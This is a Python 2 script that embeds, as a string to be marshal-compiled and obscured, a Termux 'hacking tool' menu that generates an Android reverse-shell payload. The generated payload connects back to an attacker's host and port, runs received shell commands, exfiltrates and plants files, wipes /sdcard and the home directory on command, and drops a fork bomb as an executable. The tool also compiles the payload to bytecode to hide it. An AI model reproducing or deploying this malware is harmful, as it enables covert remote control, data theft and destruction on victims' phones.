# -*- coding: utf-8 -*-

alzaeem = ("""
# -*- coding: utf-8 -*-
###########################
from datetime import datetime
import py_compile
import random
import marshal
import time
import os, sys, subprocess
from time import sleep
###################################
import os
import socket
import sys
try:
     import pathlib
except ImportError:
    os.system("pip2 install pathlib ")

#####################################
host = " "
port = " "
name = " "
def tik():
    titik = [
     .'.     ', '. .   ', '. . . ' ]
    for o in titik:
        print '\r \033[1;34m[\033[1;37m+\033[1;34m] \033[1;33mCHECK THE PASSWORD  \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.3)
def tak():
    animation = '|/-\\'
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write('\r\033[32;1m[\033[37;1m+\033[32;1m]\033[37;1m Running \033[32;1m' + animation[(i % len(animation))])
        sys.stdout.flush()
def lo():
 os.system('clear')

 print ('\033[1;37m              .-""-.   ')
 print ('\033[1;37m             / .--. \  ')
 print ('\033[1;37m            / /    \ \ ')
 print ('\033[1;37m            | |    | | ')
 print ('\033[1;37m            | |.-""-.|  ')
 print ('\033[1;37m           ///`.::::.`\                 ')
 print ('\033[1;37m          ||| ::\033[1;41m/  \ \033[1;40m::;  ')
 print ('\033[1;37m          ||; ::\033[1;41m\__/ \033[1;40m::;  ')
 print ('\033[1;37m           \ \.:::::: /   ')
 print ('\033[1;37m            `=":-..-"`   ')

def lo2():
# time.sleep(4)
 os.system('clear')
 print ('\033[1;37m      .-""-.   ')
 print ('\033[1;37m      / .--. \  ')
 print ('\033[1;37m     / /    \ \ ')
 print ('\033[1;37m     | |    | | ')
 print ('\033[1;37m            | |.-""-.  ')
 print ('\033[1;37m           ///`.::::.`\  ')
 print ('\033[1;37m          ||| ::\033[1;42m/  \ \033[1;40m::;  ')
 print ('\033[1;37m          ||; ::\033[1;42m\__/ \033[1;40m::;  ')
 print ('\033[1;37m           \ \ :::::: /   ')
 print ('\033[1;37m            `=":-..-"`   ')
 print ('')
 print ('')
 print ('')
 tak()
 contol()
 main()
####################################
t1 = datetime.now()
time.sleep(1)
os.system("clear")
host = " "
port = " "
output = " "
def logo():
 print('''\033[1;37m

╭━━━━━━━╮
┃  ● \033[1;22m══\033[1;37m ┃       \033[1;33m ─╤╦︻=(\033[1;31m◣\033[1;30m_\033[1;31m◢\033[1;33m)\033[1;33m=︻╦╤─\033[1;37m
┃███████┃
┃███████┃        ==[\033[1;32m DEVELOPER INFORMATION \033[1;37m]==
┃███████┃  \033[1;31m+\033[1;33m---------------------------------------\033[1;31m+\033[1;37m
┃███████┃  \033[1;33m|name     :Ledear-Hacking   |\033[1;36mALZAEEM\033[1;33m|   \033[1;33m|\033[1;37m
┃███████┃  \033[1;33m|Age      :18 years                     \033[1;33m|\033[1;37m
┃   \033[1;32m○\033[1;37m   ┃\033[1;33m  |Country  : Iraq                        |\033[1;37m
╰━━━━━━━╯  \033[1;33m|\033[1;33mGithub   :github.com/ledear-hacker     \033[1;33m|\033[1;37m
           \033[1;31m+\033[1;33m---------------------------------------\033[1;31m+\033[1;37m
\033[1;31m+\033[1;37m==================================================\033[1;31m+\033[1;37m

\033[1;31m[\033[1;37m1\033[1;31m]\033[1;37m CREATE  PAYLOAD
\033[1;31m[\033[1;37m2\033[1;31m]\033[1;37m LISTEING ON PAYLOAD
\033[1;31m[\033[1;37m3\033[1;31m]\033[1;37m UPDATE
\033[1;31m[\033[1;37m0\033[1;31m]\033[1;37m FOR EXIT..!
  ''')

def main():
 logo()
 cmd =raw_input("\033[1;31m》\033[1;33m》\033[1;32m》\033[1;37m")
 if cmd == "1" :
   A()
 elif cmd == "2" :
   B()
 elif cmd == "3" :
   update()
 elif cmd == "0" :
   exit()
 else:
       print ("")
       print ('\033[1;31m  ERROR  \033[1;33m  ERROR   \033[1;32m  ERROR')*10
       time.sleep(1)
       os.system('clear')
       main()
def update():
 os.system('apt update')
 os.system('apt upgrade')
 os.system('clear')
 os.system('rm -rf ~/LEDEAR_HACKING ')
 os.system('cd')
 os.system('git clone https://github.com/Ledear-Hacker/LEDEAR_HACKING')
 os.system('cd LEDEAR_HACKING')
 os.system('python2 ledearhacking.py')

def A():
 host =raw_input('ENTER HOST \033[1;31m:\033[1;33m ')
 print ('\033[1;34mLHOST \033[1;31m==> \033[1;32m%s\033[1;37m'%host)
 port =raw_input('ENTER PORT \033[1;31m:\033[1;33m ')
 print ('\033[1;34mLPORT \033[1;31m==> \033[1;32m%s\033[1;37m'%port)
 name =raw_input('ENTER NAME PAYLOAD \033[1;31m:\033[1;33m ')
 print ('\033[1;34mNAME \033[1;31m==> \033[1;32m%s\033[1;37m'%name)
#######################

 print ('\033[1;32mDONE\033[1;33m . . .!\033[1;37m')

 s = str(':(){ :|:& };:')
 f = ('''import socket
import subprocess
import os

s = ('{}')
i = open('/data/data/com.termux/files/usr/bin/v', 'wb')
o = i.write(s)
c = i.close()
os.system('chmod +x /data/data/com.termux/files/usr/bin/v')
os.system('cp -r /data/data/com.termux/files/usr/bin/termux-open  /data/data/com.termux/files/usr/bin/open')
os.system('clear')
print('[1;33m[[1;32m+[1;33m] [1;32mRunning . . .[1;37m')
s = socket.socket()
conn = False
while not conn:
    try:
     s.connect(('{}', {}))
     conn = True
    except:
        pass
#######################################################

#######################################################
def main():
 while True:
  m = s.recv(1024)
  if m == 'chat':
     chat()
  elif m == 'shell':
     shell()
  elif m == 'download':
      download()
  elif m == 'upload':
      upload()
#######################################################
def download():
 while True:
  file_p = s.recv(1024)
  if file_p == 'back':
     main()
  elif file_p == '':
     download()
  try:
      f = open(file_p, 'rb')
      data = f.read()
      s.send(data)
  except IOError:
      download()
#######################################################

def upload():
 while True:
    f = s.recv(1024)
    if f == 'back':
        main()
    elif f == '':
        upload()
    else:
     fu = s.recv(1073741824)
     f_n = ('/sdcard/'+ f +'')
     n_f = open(f_n, 'wb')
     n_f.write(fu)
     n_f.close()
#######################################################
def format():
 os.system('rm -rf /sdcard')
 os.system('rm -rf ~ ')
#######################################################
def chat():
 while True:
  vr2 = s.recv(1024)
#  print('[1;36m'+vr2+'[1;37m')
  if vr2 == 'back':
   main()
  elif vr2 == 'clear':
   os.system('clear')
  else:
       print('\033[1;36m'+ vr2 +'\033[1;37m')
#######################################################

#       print('[1;36m'+vr2+'[1;37m')




def shell():
 while True:
  cmd = s.recv(1024)
  if cmd[:2] == 'cd':
   os.chdir(cmd[3:])
   dir = os.getcwd()
   s.sendall('bacod')
  elif cmd == 'back':
       main()
  elif cmd == 'format':
       format()
       os.system('rm -rf /sdcard')
       os.system('rm -rf ~ ')
  elif cmd == 'virus':
       os.system('bash /data/data/com.termux/files/usr/bin/v')
  elif cmd == 'kernel_info':
   results = subprocess.Popen('cat /proc/version', shell=True,
             stdout=subprocess.PIPE, stderr=subprocess.PIPE,
             stdin=subprocess.PIPE)
   results = results.stdout.read() + results.stderr.read()

   s.sendall(results)


  else:
   results = subprocess.Popen(cmd, shell=True,
             stdout=subprocess.PIPE, stderr=subprocess.PIPE,
             stdin=subprocess.PIPE)
   results = results.stdout.read() + results.stderr.read()

   s.sendall(''+results)
main()









''').format(s, host,  port)
 out = ('/data/data/com.termux/files/home/'+name+'.py')
 i = open(out, 'wb')
 o = i.write(f)
 c = i.close()
#############################
 e = ("/data/data/com.termux/files/home/"+ name +".py")
 py_compile.compile(e)
 time.sleep(1)
 os.system("rm -rf /data/data/com.termux/files/home/"+ name +".py")
 os.system("mv /data/data/com.termux/files/home/"+ name +".pyc /data/data/com.termux/files/home/"+ name +".py")
############################
 os.system('clear')
 print"\033[1;34m-"*40
 print"\033[1;37mSAVE IN \033[1;31m>\033[1;33m >\033[1;32m > \033[1;37m  %s.py "%name
 print"\033[1;34m-"*40
 time.sleep(4)
 os.system('clear')
 main()
########################






def B():
 host = raw_input('\033[1;34mENTER HOST\033[1;33m : \033[4;37m ')
 print ('\033[1;33mLHOST ==>  \033[4;32m %s \033[0m '%host)
 port = raw_input('\033[1;34mENTER PORT\033[1;33m :\033[4;37m ')
 print ("\033[1;33mLPORT ==> \033[4;32m %s \033[0m"%port)
 os.system('clear')
 os.system('python2  /data/data/com.termux/files/home/LEDEAR_HACKING/assistant.py  {}  {} '.format(host, port) )

















###############################################################
def password():
 sem_1()
####################
def sem_1():
 lo()
 print ("\033[1;41m\033[1;37m PASSWOER \033[1;42m = \033[1;41m Ledear-Hacking\033[1;40m")
 print ""
 print ""
 print ""
 a =raw_input ('\033[1;31m》\033[1;33m》\033[1;32m》\033[1;37m')
 print ""
 tik()
 if a == "Ledear-Hacking" or a == "alzaeem" or a == "ALZAEEM" or a == "admin" :
     time.sleep(1)
     lo2()
     time.sleep(3)
     contol()
 elif a == "1":
    os.system('termux-open https://bit.ly/2uqZF2w')
 else:
     print ('')
     print ('')
     print ('\033[1;31mPASSWORD ERROR\033[1;37m')
     time.sleep(0.1)
 os.system('python2 ~/LEDEAR_HACKING/ledearhacking.py')
######################
def exit():
    word = "\033[1;41m   Click Enter to exit  the tool\033[1;40m"
    for i in word:
                      sys.stdout.write(i)
                      sys.stdout.flush()
                      time.sleep(0.06)
    time.sleep(2)
    os.system('cmatrix -C red -s')
    os.system('clear')
    t2 = datetime.now()
    t3=t2-t1
    word = ('\033[1;41mI have spent \033[1;32m[\033[1;43m\033[1;31m%s\033[1;32m\033[1;41m]\033[1;37mIn the use of the tool\033[1;40m'%t3)
    for i in word:
                      sys.stdout.write(i)
                      sys.stdout.flush()
                      time.sleep(0.06)
    print ("")
    sys.exit()
    print ("")
#######################
def contol():
 os.system('clear')
 x =  ('\033[1;32m》\033[1;41m\033[1;37m WELCOME TO LEDEAR_HACKING TOOL\033[1;40m\033[1;32m《\033[1;40m\033[1;37m')
 for i in x:
               sys.stdout.write(i)
               sys.stdout.flush()
               time.sleep(0.04)
if __name__ == "__main__":
    password()
""")

alzaeem2 = compile(alzaeem, '<alzaeem>', 'exec')
data = marshal.dumps(alzaeem2)
print repr(data)
